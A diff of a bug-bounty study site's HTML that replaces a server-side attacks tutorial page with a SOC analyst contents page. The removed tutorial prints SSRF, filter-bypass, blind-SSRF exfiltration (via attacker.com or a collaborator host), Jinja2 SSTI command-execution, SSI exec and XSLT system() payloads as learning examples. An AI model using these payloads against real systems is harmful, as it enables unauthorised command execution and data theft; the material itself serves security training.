@@ -9,22 +9,20 @@
       
       
       
-        <link rel="prev" href="../file-upload-attacks-guide/">
+        <link rel="prev" href="../bug-bounty-guide/gobuster-cheat/">
       
       
-        <link rel="next" href="../login-brute-forcing-guide/">
       
-      
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
     
     
       
-        <title>Server-side Attacks - Bug Bounty Hub</title>
+        <title>Contents - Bug Bounty Hub</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
       
       
 
@@ -43,7 +41,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -62,7 +60,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#server-side-attacks" class="md-skip">
+        <a href="#soc-analyst-guide" class="md-skip">
           Skip to content
         </a>
       
@@ -78,7 +76,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="Bug Bounty Hub" class="md-header__button md-logo" aria-label="Bug Bounty Hub" data-md-component="logo">
+    <a href=".." title="Bug Bounty Hub" class="md-header__button md-logo" aria-label="Bug Bounty Hub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -98,7 +96,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Server-side Attacks
+              Contents
             
           </span>
         </div>
@@ -176,7 +174,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Bug Bounty Hub" class="md-nav__button md-logo" aria-label="Bug Bounty Hub" data-md-component="logo">
+    <a href=".." title="Bug Bounty Hub" class="md-nav__button md-logo" aria-label="Bug Bounty Hub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -194,7 +192,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href=".." class="md-nav__link">
         
   
   
@@ -213,20 +211,18 @@
       
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
@@ -242,7 +238,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             Bug Bounty Guide
@@ -256,7 +252,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../" class="md-nav__link">
+      <a href="../bug-bounty-guide/" class="md-nav__link">
         
   
   
@@ -279,7 +275,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bug-bounty-process/" class="md-nav__link">
+      <a href="../bug-bounty-guide/bug-bounty-process/" class="md-nav__link">
         
   
   
@@ -299,20 +295,18 @@
                 
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
         
           
           <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
@@ -328,7 +322,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2_3">
             <span class="md-nav__icon md-icon"></span>
             Guides
@@ -342,7 +336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../information-gathering-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/information-gathering-guide/" class="md-nav__link">
         
   
   
@@ -365,7 +359,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cross-site-scripting-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/cross-site-scripting-guide/" class="md-nav__link">
         
   
   
@@ -388,7 +382,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sql-injection-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/sql-injection-guide/" class="md-nav__link">
         
   
   
@@ -411,7 +405,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../command-injections-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/command-injections-guide/" class="md-nav__link">
         
   
   
@@ -434,7 +428,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../file-upload-attacks-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/file-upload-attacks-guide/" class="md-nav__link">
         
   
   
@@ -454,32 +448,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    Server-side Attacks
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../bug-bounty-guide/server-side-attacks-guide/" class="md-nav__link">
         
   
   
@@ -490,131 +462,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#step-by-step-guide-for-testing-and-exploiting-server-side-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-understand-server-side-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      1. Understand Server-Side Vulnerabilities
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-identify-entry-points" class="md-nav__link">
-    <span class="md-ellipsis">
-      2. Identify Entry Points
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-test-for-ssrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      3. Test for SSRF
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-exploit-blind-ssrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      4. Exploit Blind SSRF
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#5-bypass-ssrf-defenses" class="md-nav__link">
-    <span class="md-ellipsis">
-      5. Bypass SSRF Defenses
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#6-test-for-ssti" class="md-nav__link">
-    <span class="md-ellipsis">
-      6. Test for SSTI
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#7-identify-template-engine" class="md-nav__link">
-    <span class="md-ellipsis">
-      7. Identify Template Engine
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#8-exploit-ssti-for-rce" class="md-nav__link">
-    <span class="md-ellipsis">
-      8. Exploit SSTI for RCE
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#9-test-for-ssi-and-xslt-injection" class="md-nav__link">
-    <span class="md-ellipsis">
-      9. Test for SSI and XSLT Injection
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#10-assess-prevention-measures" class="md-nav__link">
-    <span class="md-ellipsis">
-      10. Assess Prevention Measures
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -627,7 +474,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../login-brute-forcing-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/login-brute-forcing-guide/" class="md-nav__link">
         
   
   
@@ -650,7 +497,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../broken-authentication-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/broken-authentication-guide/" class="md-nav__link">
         
   
   
@@ -673,7 +520,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-attacks-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/web-attacks-guide/" class="md-nav__link">
         
   
   
@@ -696,7 +543,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../file-inclusion-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/file-inclusion-guide/" class="md-nav__link">
         
   
   
@@ -719,7 +566,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../session-security-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/session-security-guide/" class="md-nav__link">
         
   
   
@@ -742,7 +589,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-service-api-attacks-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/web-service-api-attacks-guide/" class="md-nav__link">
         
   
   
@@ -765,7 +612,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../hacking-wordpress-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/hacking-wordpress-guide/" class="md-nav__link">
         
   
   
@@ -788,7 +635,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bug-bounty-reporting-guide/" class="md-nav__link">
+      <a href="../bug-bounty-guide/bug-bounty-reporting-guide/" class="md-nav__link">
         
   
   
@@ -857,7 +704,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-requests/" class="md-nav__link">
+      <a href="../bug-bounty-guide/web-requests/" class="md-nav__link">
         
   
   
@@ -880,7 +727,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../introduction-to-web-applications/" class="md-nav__link">
+      <a href="../bug-bounty-guide/introduction-to-web-applications/" class="md-nav__link">
         
   
   
@@ -903,7 +750,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../using-web-proxies/" class="md-nav__link">
+      <a href="../bug-bounty-guide/using-web-proxies/" class="md-nav__link">
         
   
   
@@ -926,7 +773,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../attacking-web-applications-with-ffuf/" class="md-nav__link">
+      <a href="../bug-bounty-guide/attacking-web-applications-with-ffuf/" class="md-nav__link">
         
   
   
@@ -949,7 +796,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../javascript-deobfuscation/" class="md-nav__link">
+      <a href="../bug-bounty-guide/javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -1018,7 +865,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-requests/" class="md-nav__link">
+      <a href="../bug-bounty-guide/web-requests/" class="md-nav__link">
         
   
   
@@ -1041,7 +888,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../info-gathering-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/info-gathering-cheat/" class="md-nav__link">
         
   
   
@@ -1064,7 +911,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../ffuf-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/ffuf-cheat/" class="md-nav__link">
         
   
   
@@ -1087,7 +934,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../js-deobfuscation-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/js-deobfuscation-cheat/" class="md-nav__link">
         
   
   
@@ -1110,7 +957,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../xss-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/xss-cheat/" class="md-nav__link">
         
   
   
@@ -1133,7 +980,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqli-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/sqli-cheat/" class="md-nav__link">
         
   
   
@@ -1156,7 +1003,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqlmap-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/sqlmap-cheat/" class="md-nav__link">
         
   
   
@@ -1179,7 +1026,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cmd-injection-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/cmd-injection-cheat/" class="md-nav__link">
         
   
   
@@ -1202,7 +1049,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../file-upload-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/file-upload-cheat/" class="md-nav__link">
         
   
   
@@ -1225,7 +1072,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../server-side-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/server-side-cheat/" class="md-nav__link">
         
   
   
@@ -1248,7 +1095,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../brute-forcing-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/brute-forcing-cheat/" class="md-nav__link">
         
   
   
@@ -1271,7 +1118,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../broken-auth-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/broken-auth-cheat/" class="md-nav__link">
         
   
   
@@ -1294,7 +1141,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web-attacks-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/web-attacks-cheat/" class="md-nav__link">
         
   
   
@@ -1317,7 +1164,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../file-inclusion-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/file-inclusion-cheat/" class="md-nav__link">
         
   
   
@@ -1340,7 +1187,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../wordpress-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/wordpress-cheat/" class="md-nav__link">
         
   
   
@@ -1363,7 +1210,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../ftp-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/ftp-cheat/" class="md-nav__link">
         
   
   
@@ -1386,7 +1233,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../gobuster-cheat/" class="md-nav__link">
+      <a href="../bug-bounty-guide/gobuster-cheat/" class="md-nav__link">
         
   
   
@@ -1421,18 +1268,20 @@
       
   
   
+    
   
   
+  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
           <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
@@ -1448,7 +1297,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             SOC Analyst Guide
@@ -1459,10 +1308,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../soc-analyst-guide/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Contents
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1473,6 +1344,53 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      Contents
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#guides" class="md-nav__link">
+    <span class="md-ellipsis">
+      Guides
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cheat Sheets
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1512,107 +1430,29 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#step-by-step-guide-for-testing-and-exploiting-server-side-vulnerabilities" class="md-nav__link">
+  <a href="#contents" class="md-nav__link">
     <span class="md-ellipsis">
-      Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-understand-server-side-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      1. Understand Server-Side Vulnerabilities
+      Contents
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#2-identify-entry-points" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#guides" class="md-nav__link">
     <span class="md-ellipsis">
-      2. Identify Entry Points
+      Guides
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#3-test-for-ssrf" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheets" class="md-nav__link">
     <span class="md-ellipsis">
-      3. Test for SSRF
+      Cheat Sheets
     </span>
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-exploit-blind-ssrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      4. Exploit Blind SSRF
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#5-bypass-ssrf-defenses" class="md-nav__link">
-    <span class="md-ellipsis">
-      5. Bypass SSRF Defenses
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#6-test-for-ssti" class="md-nav__link">
-    <span class="md-ellipsis">
-      6. Test for SSTI
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#7-identify-template-engine" class="md-nav__link">
-    <span class="md-ellipsis">
-      7. Identify Template Engine
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#8-exploit-ssti-for-rce" class="md-nav__link">
-    <span class="md-ellipsis">
-      8. Exploit SSTI for RCE
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#9-test-for-ssi-and-xslt-injection" class="md-nav__link">
-    <span class="md-ellipsis">
-      9. Test for SSI and XSLT Injection
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#10-assess-prevention-measures" class="md-nav__link">
-    <span class="md-ellipsis">
-      10. Assess Prevention Measures
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1632,70 +1472,14 @@
 
 
 
-<h1 id="server-side-attacks">Server-Side Attacks</h1>
-<p><a href="../server-side-cheat/">Relative Cheat Sheet</a></p>
-<h2 id="step-by-step-guide-for-testing-and-exploiting-server-side-vulnerabilities">Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities</h2>
-<h3 id="1-understand-server-side-vulnerabilities">1. Understand Server-Side Vulnerabilities</h3>
+<h1 id="soc-analyst-guide">SOC Analyst Guide</h1>
+<p>Revision notes and cheat sheets from the Hack The Box Academy SOC Analyst course.</p>
+<h2 id="contents">Contents</h2>
+<h2 id="guides">Guides</h2>
 <ul>
-<li><strong>Explanation</strong>: Server-side vulnerabilities include Server-Side Request Forgery (SSRF), Server-Side Template Injection (SSTI), Server-Side Includes (SSI), and XSLT Injection, which allow attackers to forge internal requests, execute code via templates, or access files. SSRF targets internal resources, SSTI exploits template engines, and SSI/XSLT manipulate server directives or XML processing.</li>
-<li><strong>Why It's Done</strong>: Knowing these vulnerabilities helps identify specific input points and payloads for testing, as each has unique exploitation methods.</li>
-<li><strong>Example</strong>: SSRF might allow access to <code>http://localhost/admin</code>, while SSTI could execute <code>{{7*7}}</code> in a template.</li>
+<li><a href="incident-handling-process-guide.md">Incident Handling Process</a></li>
 </ul>
-<h3 id="2-identify-entry-points">2. Identify Entry Points</h3>
-<ul>
-<li><strong>Explanation</strong>: Find inputs that trigger server-side processing, such as URL parameters for fetching resources (SSRF), template inputs (SSTI), or XML/submit fields (SSI/XSLT). Use Burp to map these.</li>
-<li><strong>Why It's Done</strong>: These are injection points for server-side attacks; missing them limits testing scope.</li>
-<li><strong>Example</strong>: A stock check API with <code>stockApi=http://external.com</code> for SSRF.</li>
-</ul>
-<h3 id="3-test-for-ssrf">3. Test for SSRF</h3>
-<ul>
-<li><strong>Explanation</strong>: Inject internal URLs (e.g., <code>http://127.0.0.1:8080/admin</code>) or file schemes (<code>file:///etc/passwd</code>) to see if the server makes unauthorized requests.</li>
-<li><strong>Why It's Done</strong>: SSRF can access internal services, metadata, or files, revealing sensitive data.</li>
-<li><strong>Example</strong>: Change <code>stockApi=http://external.com</code> to <code>stockApi=http://localhost/admin</code> and check response.</li>
-</ul>
-<h3 id="4-exploit-blind-ssrf">4. Exploit Blind SSRF</h3>
-<ul>
-<li><strong>Explanation</strong>: If no response is visible, use out-of-band (OAST) techniques like DNS (<code>http://attacker.com</code>) or HTTP requests to confirm SSRF.</li>
-<li><strong>Why It's Done</strong>: Blind SSRF is harder to detect but can still exfiltrate data via external interactions.</li>
-<li><strong>Example</strong>: <code>stockApi=http://</code>whoami<code>.burpcollaborator.net</code> to send server data via DNS.</li>
-</ul>
-<h3 id="5-bypass-ssrf-defenses">5. Bypass SSRF Defenses</h3>
-<ul>
-<li><strong>Explanation</strong>: Use alternative formats like <code>127.1</code>, <code>@internal.com</code>, or open redirects to bypass blacklists or whitelists.</li>
-<li><strong>Why It's Done</strong>: Many SSRF protections filter only common patterns, allowing creative bypasses.</li>
-<li><strong>Example</strong>: <code>stockApi=http://127.0.0.1#@internal.com</code> to trick filters.</li>
-</ul>
-<h3 id="6-test-for-ssti">6. Test for SSTI</h3>
-<ul>
-<li><strong>Explanation</strong>: Inject template syntax like <code>${{&lt;%[%'"}}%\.</code> or <code>{{7*7}}</code> into inputs rendered by template engines (e.g., Jinja2, Twig).</li>
-<li><strong>Why It's Done</strong>: Confirms if user input is evaluated as template code, potentially leading to RCE.</li>
-<li><strong>Example</strong>: Input <code>{{7*7}}</code> in a username field; if output is <code>49</code>, it’s vulnerable.</li>
-</ul>
-<h3 id="7-identify-template-engine">7. Identify Template Engine</h3>
-<ul>
-<li><strong>Explanation</strong>: Use engine-specific payloads (e.g., <code>{{7*'7'}}</code> for Twig vs <code>{%7*7%}</code> for Jinja2) and error messages to identify the engine.</li>
-<li><strong>Why It's Done</strong>: Each engine has unique syntax for exploitation, ensuring accurate payloads.</li>
-<li><strong>Example</strong>: Error mentioning <code>Jinja2</code> or Twig-specific output like <code>7777777</code>.</li>
-</ul>
-<h3 id="8-exploit-ssti-for-rce">8. Exploit SSTI for RCE</h3>
-<ul>
-<li><strong>Explanation</strong>: Use engine-specific payloads to execute commands, like <code>{{self._filename.__class__.__init__.__globals__['os'].popen('id').read()}}</code> for Jinja2.</li>
-<li><strong>Why It's Done</strong>: Escalates from code evaluation to full command execution.</li>
-<li><strong>Example</strong>: Input <code>{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}</code> to get server user.</li>
-</ul>
-<h3 id="9-test-for-ssi-and-xslt-injection">9. Test for SSI and XSLT Injection</h3>
-<ul>
-<li><strong>Explanation</strong>: For SSI, inject directives like <code>&lt;!--#exec cmd="id" --&gt;</code> in inputs like user-agent or forms. For XSLT, submit XML with <code>&lt;xsl:value-of select="system('id')"/&gt;</code> or file reads.</li>
-<li><strong>Why It's Done</strong>: These allow command execution or file access if the server processes SSI or XSLT.</li>
-<li><strong>Example</strong>: SSI in user-agent: <code>&lt;!--#exec cmd="ls" --&gt;</code>, accessed via log inclusion.</li>
-</ul>
-<h3 id="10-assess-prevention-measures">10. Assess Prevention Measures</h3>
-<ul>
-<li><strong>Explanation</strong>: Check for input validation, sandboxing, or disabled external entities (XXE) and URL includes.</li>
-<li><strong>Why It's Done</strong>: Provides remediation recommendations, like disabling SSI or using safe template engines.</li>
-<li><strong>Example</strong>: Secure app blocks external URLs in SSRF or uses static templates.</li>
-</ul>
-<p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a detailed process for testing server-side vulnerabilities. Test ethically within scope.</p>
+<h2 id="cheat-sheets">Cheat Sheets</h2>
 
 
 
@@ -1744,10 +1528,10 @@
     
     
       
-      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.50899def.min.js"></script>
+      <script src="../assets/javascripts/bundle.50899def.min.js"></script>
       
     
   </body>
